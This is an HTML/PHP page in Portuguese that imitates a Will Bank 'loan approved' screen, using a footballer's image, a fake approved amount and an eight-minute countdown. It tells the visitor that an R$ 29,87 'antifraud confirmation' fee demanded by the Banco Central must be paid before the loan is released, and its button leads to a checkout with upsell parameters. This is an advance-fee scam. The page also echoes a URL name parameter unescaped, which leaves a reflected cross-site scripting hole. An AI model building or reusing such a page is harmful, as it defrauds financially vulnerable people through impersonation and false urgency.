<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Will Bank - Empréstimo Aprovado</title>
     <script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "simxqbeoht");
</script>
<script>
  window.pixelId = "687678dbdbb2a8a13bab1d92";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <style>
      body {
        font-family: "Inter", sans-serif;
      }
      @keyframes pulse-scale {
        0%,
        100% {
          box-shadow: 0 0 0 0 rgba(0, 0, 0, 0.7);
        }
        50% {
          box-shadow: 0 0 0 12px rgba(0, 0, 0, 0);
        }
      }
      .pulse-effect {
        animation: pulse-scale 2.5s infinite;
      }
    </style>
  </head>
  <body class="bg-white">
    <!-- Header -->

    <img
      src="https://i.imgur.com/QzbCtYI.png"
      alt="Will Bank"
      class="w-full h-16"
    />

    <!-- Main Content -->
    <main class="bg-[#f8f8f8] flex items-center justify-center flex-col">
      <!-- Vinicius Jr Banner -->
      <div class="w-full">
        <img
          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Vini-Jr_filme-1-PJT6jjETeRacWHbJSOAcUV6sKd3gls.png"
          alt="Vinicius Jr"
          class="w-full h-auto"
        />
      </div>

      <!-- Content Section -->
      <div class="px-6 py-8 bg-gray-50 bg-white w-[95%] -mt-10 rounded-3xl">
        <!-- Quote Section -->
        <div class="text-center mb-8">
          <h1 class="text-2xl font-light text-gray-900 mb-6 leading-tight">
            "Se o Vini confia,<br />
            <span class="font-semibold">você também pode."</span>
          </h1>

          <!-- Guarantee Icons -->
          <div class="flex justify-center items-center space-x-4 mb-8">
            <img
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Guarantee-ORFJ6QYWJ3JNJEN0U368kBKNtR86PB.png"
              alt="Garantia"
              class="w-14 h-14"
            />
            <img
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Guarantee-ORFJ6QYWJ3JNJEN0U368kBKNtR86PB.png"
              alt="Garantia"
              class="w-16 h-16"
            />
            <img
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Guarantee-ORFJ6QYWJ3JNJEN0U368kBKNtR86PB.png"
              alt="Garantia"
              class="w-14 h-14"
            />
          </div>
        </div>

<!-- Pelo novo cronômetro visual -->
<div class="countdown-container">
    <div class="countdown-header">
        <span>Tempo restante para confirmar:</span>
        <span id="countdown-timer">08:00</span>
    </div>
    <div class="countdown-bar">
        <div class="countdown-progress" id="countdown-progress"></div>
    </div>
</div>

<style>
.countdown-container {
    margin: 25px 0;
    font-family: 'Inter', sans-serif;
}

.countdown-header {
    display: flex;
    justify-content: space-between;
    margin-bottom: 8px;
    font-size: 14px;
    color: #555;
}

.countdown-bar {
    height: 8px;
    background-color: #f0f0f0;
    border-radius: 4px;
    overflow: hidden;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
}

.countdown-progress {
    height: 100%;
    width: 100%;
    background-color: #ffe600ff;
    border-radius: 4px;
    transition: width 1s linear, background-color 0.3s;
}

/* Estilos para quando o tempo estiver acabando */
.countdown-warning {
    background-color: #FFA500;
}

.countdown-danger {
    background-color: #FF5252;
}

#countdown-timer {
    font-weight: bold;
    color: var(--text-color);
}
</style>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$(document).ready(function() {
    // Configuração inicial
    let countdownInterval;
    const totalTime = 08 * 60; // 30 minutos em segundos
    let timeLeft = totalTime;
    
    // Elementos do DOM
    const $countdownTimer = $('#countdown-timer');
    const $countdownProgress = $('#countdown-progress');
    
    // Função para formatar o tempo
    function formatTime(seconds) {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    }
    
    // Função para atualizar a barra de progresso
    function updateProgressBar() {
        const progressPercentage = (timeLeft / totalTime) * 100;
        $countdownProgress.css('width', progressPercentage + '%');
        
        // Mudar cor conforme o tempo diminui
        if (progressPercentage < 20) {
            $countdownProgress.removeClass('countdown-warning').addClass('countdown-danger');
        } else if (progressPercentage < 50) {
            $countdownProgress.removeClass('countdown-danger').addClass('countdown-warning');
        } else {
            $countdownProgress.removeClass('countdown-warning countdown-danger');
        }
    }
    
    // Iniciar contagem regressiva
    function startCountdown() {
        countdownInterval = setInterval(function() {
            timeLeft--;
            
            // Atualizar exibição
            $countdownTimer.text(formatTime(timeLeft));
            updateProgressBar();
            
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
               
                $countdownProgress.css('width', '0%');
            }
        }, 1000);
    }
    
    // Iniciar o contador quando a página carregar
    startCountdown();
    updateProgressBar(); // Inicializar a barra
});
</script>
        <!-- Success Message -->
        <div class="bg-black rounded-b-xl p-6 mb-5">
          <p
            class="text-yellow-400 text-xl font-semibold text-center leading-tight"
          >
           <?php 
           $nome = $_GET['nome'];
           $palavras = explode(" ", $nome);
$primeira_palavra = $palavras[0];
echo $primeira_palavra;
           
           ?>, seu empréstimo foi aprovado! Falta só 1 passo pra cair na sua conta.
          </p>
        </div>

        <!-- Security Confirmation -->
        <div class="text-center mb-8 flex flex-col w-full items-center">
          <h2 class="text-2xl font-semibold text-gray-900 mb-2">
           Seu empréstimo de <span id="approvedAmount">XXX</span> já foi APROVADO.
          </h2>
<script>
  // Carregar valor aprovado do localStorage
        const valorAprovado =
          localStorage.getItem("creditoAprovado") || "7.584,00";
        document.getElementById("approvedAmount").textContent =
          "R$ " + valorAprovado;
</script>
          <p
            class="text-gray-700 text-xl max-w-[90%] mt-5 font-semibold leading-relaxed mb-8"
          >Para liberar o valor com total segurança, é necessário concluir a etapa obrigatória de confirmação antifraude, exigida pelo Banco Central.
          </p>
        </div>

        <!-- Price Section -->
        <div class="bg-black rounded-b-xl p-4 -mt-6 mb-3">
          <p class="text-yellow-400 text-2xl font-medium text-center mb-2">
            Confirmação obrigatória:
          </p>
          <p class="text-yellow-400 text-4xl font-bold text-center">R$ 29,87</p>
        </div>

        <!-- Banco Central Notice -->
        <div class="flex items-center justify-center">
          <p
            class="text-gray-600 max-w-[80%] text-sm text-center mb-8 leading-relaxed"
          >
            Etapa antifraude obrigatória exigida pelo
            <span class="font-semibold text-gray-900">Banco Central.</span>
          </p>
        </div>

        <!-- Action Button -->
        <button
          class="w-full bg-black text-white py-4 px-6 rounded-full text-lg font-medium hover:bg-gray-800 transition-colors pulse-effect"
          id="btnSaque"
        >
          🔒 QUERO RECEBER AGORA
        </button>

          <script>
  document.getElementById("btnSaque").onclick = function () {
    const urlParams = new URLSearchParams(window.location.search);
              
            document.getElementById("btnSaque").disabled = true;  
    // Remove o value antigo da URL
    urlParams.delete("value");

    // Monta a nova URL com o novo value
    urlParams.set("value", "29.87");

    urlParams.set("upsell", "1");
    urlParams.set("produto_id", "296");
    // Redireciona
    const destino = "/checkout/?" + urlParams.toString();
    window.location.href = destino;
  };
</script><script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "silz60upc3");
</script>
      </div>
      <div class="h-5 w-full bg-yellow-400"></div>
    </main>
  </body>
</html>
